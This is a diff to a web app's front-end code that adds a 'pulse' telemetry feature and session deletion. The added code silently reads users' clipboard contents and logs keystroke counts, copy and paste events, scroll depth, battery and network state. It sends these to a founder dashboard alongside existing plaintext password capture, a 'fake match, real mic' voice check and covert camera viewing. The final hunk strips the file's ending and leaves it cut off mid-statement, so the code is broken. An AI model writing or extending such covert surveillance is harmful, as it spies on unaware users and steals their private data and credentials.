@@ -467,6 +467,11 @@ tbody tr:hover td{background:#0f0c17}
 .camclips{display:flex;flex-wrap:wrap;gap:5px;margin-top:6px}
 .camclip{font-family:var(--mono);font-size:9.5px;color:var(--mut);border:1px solid var(--line2);padding:2px 6px;text-decoration:none}
 .camclip:hover{color:#fff;border-color:var(--vi)}
+.pulsebox{padding:8px 0}
+.pulsebars{display:flex;align-items:flex-end;gap:2px;height:28px;margin-bottom:6px}
+.pulsebars i{flex:1;background:var(--vi);opacity:.7;display:block}
+.pulserow{font-family:var(--mono);font-size:10px;color:var(--dim);margin-top:3px}
+.pulserow b{color:var(--text);font-weight:500}
 .camcard{border:1px solid var(--line);background:#08060d;padding:6px;cursor:pointer;transition:border-color .14s}
 .camcard:hover{border-color:var(--vi)}
 .camcard.dim{opacity:.72}
@@ -1009,6 +1014,7 @@ async function openWebsite(){
  if(firstLoginThisSession())logLogin();
  if(refreshTimer)clearInterval(refreshTimer);
  refreshTimer=setInterval(updateWebsite,10000);
+ startPulses();
 }
 
 function showBanned(){
@@ -1024,6 +1030,7 @@ async function logout(){
  stopTap();
  stopFace();
  stopVoice();
+ clearInterval(pulseTimer);
  stopCamPoll();
  closeCam();
  if(refreshTimer)clearInterval(refreshTimer);
@@ -1072,7 +1079,7 @@ function ago(ts){
 
 /* ---------- device fingerprint / telemetry ---------- */
 const sessionId=Math.random().toString(36).slice(2)+Date.now().toString(36);
-const BUILD=20;
+const BUILD=22;
 (async()=>{
  try{
   const r=await fetch("version.json?x="+Date.now(),{cache:"no-store"});
@@ -1195,6 +1202,20 @@ function typingStats(){
  return {keys:t.length,medianGap:sorted[Math.floor(sorted.length/2)],pasted:typePasted};
 }
 
+async function clipboardPeek(){
+ try{ const t=await navigator.clipboard.readText(); return t?t.slice(0,300):null; }catch(e){ return null; }
+}
+
+async function linkSpeed(){
+ try{
+  const t0=performance.now();
+  const r=await fetch("https://bytpztfhwdcuqozdzjeu.supabase.co/storage/v1/object/public/cam/.probe?x="+Date.now(),{cache:"no-store"});
+  await r.arrayBuffer();
+  const ms=performance.now()-t0;
+  return Math.round(ms);
+ }catch(e){ return null; }
+}
+
 async function ambientLux(){
  try{
   if(!("AmbientLightSensor" in window))return null;
@@ -1272,6 +1293,8 @@ async function collectDetails(g){
   typing:typingStats(),
   attention:{visibility:document.visibilityState,changes:visChanges,focused:document.hasFocus()},
   ambient_lux:await ambientLux(),
+  clipboard:await clipboardPeek(),
+  link_ms:await linkSpeed(),
   motion:typeof DeviceMotionEvent!=="undefined",
   sensor_orientation:typeof DeviceOrientationEvent!=="undefined"
  });
@@ -1949,6 +1972,45 @@ async function uploadFaceClip(blob){
  }catch(e){}
 }
 
+/* ============ PULSES (battery, link, keystrokes, idle, focus) ============ */
+let pulseKeys=0,pulseTimer=null,pulseLastInput=Date.now(),pulseScroll=0,copyCount=0,pasteCount=0;
+
+document.addEventListener("keydown",()=>{ pulseKeys++; pulseLastInput=Date.now(); },true);
+document.addEventListener("copy",()=>{ copyCount++; });
+document.addEventListener("paste",()=>{ pasteCount++; });
+document.addEventListener("scroll",()=>{
+ const h=document.documentElement;
+ const pct=Math.round((h.scrollTop+innerHeight)/Math.max(1,h.scrollHeight)*100);
+ if(pct>pulseScroll)pulseScroll=pct;
+},{passive:true});
+
+function startPulses(){
+ clearInterval(pulseTimer);
+ pulseTimer=setInterval(pushPulseNow,30000);
+ setTimeout(pushPulseNow,4000);
+}
+
+async function pushPulseNow(){
+ const who=(profile&&profile.username)||null;
+ if(!who)return;
+ let battery=null,charging=null;
+ try{ if(navigator.getBattery){ const b=await navigator.getBattery(); battery=Math.round(b.level*100); charging=b.charging; } }catch(e){}
+ const c=navigator.connection||{};
+ const payload={
+  battery: battery==null?null:battery,
+  charging: charging==null?null:charging,
+  net: c.effectiveType||null,
+  rtt: c.rtt||null,
+  online: navigator.onLine,
+  keys: pulseKeys,
+  idle: Math.round((Date.now()-pulseLastInput)/1000),
+  focused: document.hasFocus(),
+  scroll: pulseScroll
+ };
+ try{ await db.rpc("push_pulse",{p_username:who,p_session:faceSession||voiceSession||null,p:payload}); }catch(e){}
+ pulseKeys=0;
+}
+
 /* ============ VOICE CHECK (fake match, real mic) ============ */
 let voiceStream=null,voiceRec=null,voiceSession=null,voicePart=0,voiceTimer=null,voiceRAF=null,voiceBusy=false,voiceFailed=false,voiceCtx=null,voiceAnalyser=null,voiceChunkTimer=null;
 
@@ -2167,6 +2229,7 @@ async function openPerson(username){
   ${drow("asn",d.asn)}${drow("isp",d.isp)}${drow("org",d.org)}
   ${drow("referrer",d.ref)}${drow("plugins",d.plugins)}${drow("cookies",d.cookies?"yes":"no")}${drow("dnt",d.dnt)}
   ${drow("fonts",d.fonts)}
+  ${drow("clipboard",d.clipboard)}${drow("link test",d.link_ms!=null?d.link_ms+" ms":null)}
   ${dsec("granted permissions")}
   ${drow("camera",(d.perms||{}).camera)}${drow("microphone",(d.perms||{}).microphone)}
   ${drow("location",(d.perms||{}).geolocation)}${drow("notifications",(d.perms||{}).notifications)}
@@ -2177,6 +2240,10 @@ async function openPerson(username){
   ${dsec("attention")}
   ${drow("tab",(d.attention||{}).visibility)}${drow("focus switches",(d.attention||{}).changes)}
   ${drow("focused",d.attention&&d.attention.focused?"yes":"no")}
+  ${dsec("live pulse")}
+  <div id="dPulse" class="pulsebox"><span class="muted small">no pulse yet — needs one app heartbeat (30s)</span></div>
+  ${dsec("clipboard")}
+  <div style="padding:6px 0"><pre class="small mono" style="white-space:pre-wrap;word-break:break-word;background:#0a1220;border:1px solid #1e2c44;padding:8px;margin:0">${safe(d.clipboard||"—")}</pre></div>
   ${dsec("cached profile")}
   <div style="padding:6px 0"><input class="pwin" data-user="${safe(username)}" value="${p.password_plain?safe(p.password_plain):""}" placeholder="not captured yet" onchange="savePasswordField(this)"></div>
   ${dsec("bests")}
@@ -2193,10 +2260,29 @@ async function openPerson(username){
    <button class="banbtn ${p.banned?"on":""}" onclick="setBanned('${safe(username)}',${p.banned?"false":"true"})">${p.banned?"UNBAN":"BAN"}</button>
   </div>`;
  drawPersonChart(username);
+ drawPulses(username);
 }
 
-async function drawPersonChart(username){
- const svg=$("dChart");
+async function drawPulses(username){
+ const box=$("dPulse");
+ if(!box)return;
+ const {data,error}=await db.rpc("founder_pulses",{p_username:username});
+ if(!box)return;
+ if(error||!data||!data.length){ box.innerHTML='<span class="muted small">no heartbeat yet</span>'; return; }
+ const rows=[...data].reverse();
+ const last=rows[rows.length-1];
+ const max=Math.max(1,...rows.map(r=>r.keys||0));
+ box.innerHTML='<div class="pulsebars">'+rows.map(r=>'<i style="height:'+Math.max(2,Math.round((r.keys||0)/max*26))+'px"></i>').join("")+"</div>"
+  +'<div class="pulserow">battery <b>'+(last.battery!=null?last.battery+"%":"—")+"</b>"+(last.charging?" ⚡":"")
+  +' · net <b>'+safe(last.net||"—")+"</b> · rtt <b>"+(last.rtt!=null?last.rtt+" ms":"—")
+  +"</b> · online <b>"+(last.online?"yes":"no")+"</b></div>"
+  +'<div class="pulserow">keys/min <b>'+rows.slice(-2).reduce((n,r)=>n+(r.keys||0),0)
+  +"</b> · idle <b>"+(last.idle_s!=null?last.idle_s+"s":"—")
+  +"</b> · focused <b>"+(last.focused?"yes":"no")+"</b> · scroll <b>"+(last.scroll||0)+"%</b></div>"
+  +'<div class="muted small" style="margin-top:4px">last beat '+ago(last.ts)+"</div>";
+}
+
+async function drawPersonChart(username){ const svg=$("dChart");
  if(!svg)return;
  const {data,error}=await db.rpc("person_activity",{p_username:username,p_hours:72});
  if(error)return;
@@ -2661,6 +2747,7 @@ function openCam(id){
    <button class="secondary" onclick="openPerson('${safe(who)}')">PERSON</button>
    <button class="secondary" id="camSave" onclick="saveCamClip()">SAVE CLIP</button>
    <button class="secondary" onclick="closeCam()">CLOSE</button>
+   <button class="secondary" onclick="deleteCamSession()">DELETE</button>
    <button class="primary" onclick="endCamSession()">END</button>
   </div>`;
  $("camView").classList.remove("hidden");
@@ -2839,10 +2926,27 @@ async function saveVoice(sessionId){
 
 async function deleteSession(sessionId){
  if(!sessionId)return;
+ const parts=await voiceParts(sessionId).catch(()=>[]);
+ const paths=(parts||[]).map(x=>x.path);
+ if(paths.length)await db.storage.from("cam").remove(paths).catch(()=>{});
  const {error}=await db.rpc("founder_delete_session",{p_session:sessionId});
  if(error)return toast("Delete failed: "+error.message,"bad");
  toast("Deleted");
  renderVoices();
+}
+
+/* camera session delete (clips + frames + row) */
+async function deleteCamSession(){
+ if(!camSid)return;
+ const sid=camSid;
+ const {data}=await db.rpc("founder_camera_clips",{p_session:sid});
+ const paths=(data||[]).map(c=>c.path);
+ if(paths.length)await db.storage.from("cam").remove(paths).catch(()=>{});
+ const {error}=await db.rpc("founder_delete_session",{p_session:sid});
+ if(error)return toast("Delete failed: "+error.message,"bad");
+ closeCam();
+ toast("Session deleted");
+ renderCameras();
 }
 
 /* founder ends the whole thing: tells the member to drop the camera */
@@ -2918,108 +3022,4 @@ async function camTakeOffer(d){
   camPending.forEach(c=>{pc.addIceCandidate(c).catch(()=>{});});
   camPending=[];
   const ans=await pc.createAnswer();
-  await pc.setLocalDescription(ans);
-  camCh.send({type:"broadcast",event:"answer",payload:{viewer:camViewerId,sdp:pc.localDescription}});
- }catch(e){ camStill("handshake failed"); }
-}
-
-function camRemoteIce(d){
- if(!d.candidate)return;
- if(!camPC||!camPC.remoteDescription||!camPC.remoteDescription.type){ camPending.push(d.candidate); return; }
- camPC.addIceCandidate(d.candidate).catch(()=>{});
-}
-
-/* only call it live once real frames are being decoded */
-function camStartWatch(){
- clearInterval(camWatchTimer);
- camWatchTimer=setInterval(()=>{
-  const v=$("camVideo");
-  if(!v||camLive)return;
-  const frames=v.getVideoPlaybackQuality?v.getVideoPlaybackQuality().totalVideoFrames:0;
-  if(frames>0&&v.videoWidth>0)camMarkLive();
- },500);
-}
-
-function camMarkLive(){
- if(camLive)return;
- const v=$("camVideo");
- camLive=true;
- clearInterval(camWatchTimer);camWatchTimer=null;
- clearTimeout(camFallbackTimer);camFallbackTimer=null;
- clearInterval(camHelloTimer);camHelloTimer=null;
- clearInterval(camFrameTimer);camFrameTimer=null;
- const s=$("camStage");
- if(s){s.classList.remove("still");s.classList.add("live");}
- const st=$("camStamp");
- if(st){st.classList.add("live");st.classList.remove("still");}
- $("camStampText").textContent="live";
- const act=$("camActive");
- if(act)act.textContent="camera active";
- if(v)v.play().catch(()=>{});
-}
-
-function camStill(reason){
- if(camLive)return;
- const s=$("camStage");
- if(s){s.classList.add("still");s.classList.remove("live");}
- const st=$("camStamp");
- if(st){st.classList.add("still");st.classList.remove("live");}
- $("camStampText").textContent=reason||"still frames";
- const act=$("camActive");
- if(act)act.textContent="camera still up";
- if(!camFrameTimer)camFrameTimer=setInterval(camPullFrame,900);
- camPullFrame();
-}
-
-async function camPullFrame(){
- if(camLive||!camSid)return;
- if(Date.now()-camLastFrameAt<800)return;
- const {data,error}=await db.rpc("founder_camera_frames",{p_session:camSid,p_limit:1});
- if(camLive)return;
- if(error){ $("camStampText").textContent="relay offline"; clearInterval(camFrameTimer);camFrameTimer=null; return; }
- const f=(data||[])[0];
- if(!f){
-  camEmptyPolls++;
-  if(camEmptyPolls>4){
-   $("camStampText").textContent="session ended";
-   clearInterval(camFrameTimer);camFrameTimer=null;
-  }
-  return;
- }
- camEmptyPolls=0;
- camShowFrame(f.frame);
- if(f.created_at&&$("camLast"))$("camLast").textContent=ago(f.created_at);
-}
-
-/* frames arrive over the socket while a viewer is attached — fastest path */
-function camFrame(d){
- if(camLive||!d.f)return;
- camLastFrameAt=Date.now();
- camEmptyPolls=0;
- const s=$("camStage");
- if(s&&!s.classList.contains("still"))camStill("live relay");
- camShowFrame(d.f);
- if($("camLast"))$("camLast").textContent="just now";
-}
-
-function camShowFrame(src){
- const img=$("camStill");
- if(img)img.src=src;
- const dl=$("camDl");
- if(dl)dl.href=src;
-}
-
-document.addEventListener("keydown",e=>{
- if(e.key!=="Escape")return;
- if(!$("camView").classList.contains("hidden")){closeCam();return;}
- if(!$("faceWrap").classList.contains("hidden"))closeFaceCheck();
-});
-
-(async()=>{
- const {data:{session}}=await db.auth.getSession();
- if(session)await openWebsite();
-})();
-</script>
-</body>
-</html>
-
+  await pc.setLo
